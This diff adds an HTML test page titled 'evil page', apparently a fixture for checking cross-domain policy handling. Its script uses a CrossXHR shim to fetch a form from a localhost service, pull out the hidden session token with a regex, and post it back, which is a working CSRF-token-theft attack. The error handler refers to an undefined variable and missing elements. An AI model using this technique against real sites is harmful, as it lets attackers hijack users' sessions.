@@ -1,0 +1,67 @@
+evil page
+<script src="crossxhr/crossxhr.js"></script>
+<pre id="response"></pre>
+<div id="error" style="display:none">Error: <span id="error_message"></span>.
+
+<script>
+var request;
+var AuthId = "";
+setTimeout(function() {
+    request = new CrossXHR();
+    request.onreadystatechange = function() {
+        callback();
+
+        setTimeout(function() {
+            console.log("get form");
+            var form = document.getElementById("response").innerText;
+            console.log("form = " + form);
+            var res = /name='session'\s+value='([^']+)'/.exec(form);
+            if (res != null && res.length > 1) {
+                AuthId = res[1];
+            } else {
+                return 
+            }
+            console.log("AuthId = " + AuthId);
+
+            request = new CrossXHR();
+            request.onreadystatechange = callback;
+            request.open('POST', "http://localhost{{ .Port }}/post_id.lua");
+            request.send("session="+AuthId);
+        }, 2000);
+    }
+    request.open('GET', "http://localhost{{ .Port }}/form.lua", true);
+    request.send();
+
+}, 400);
+
+function callback() {
+    console.log("callback():")
+    if (request.readyState == 4) {
+        try {
+            if (request.status != 200) {
+                show_error('response status is not 200');
+            } else {
+                show_response(request.responseText);
+            }
+        } catch(e) {
+            show_error('unknown error');
+        }
+    }
+}
+
+function show_response(response){
+  document.getElementById("response").innerText = "Response: "+response;
+}
+function show_error(message){
+  var crossdomain_xml = url.substring(0,url.lastIndexOf("/"))+"/crossdomain.xml";
+  document.getElementById("error").style.display = 'block';
+  document.getElementById("error_message").innerText = message;
+  document.getElementById("crossdomain_xml").href = crossdomain_xml;
+  document.getElementById("crossdomain_xml").innerText = crossdomain_xml;
+} 
+function reset(){
+  document.getElementById("error").style.display = 'none';
+  document.getElementById("response").innerText = "";
+}
+</script>
+</BODY></HTML> 
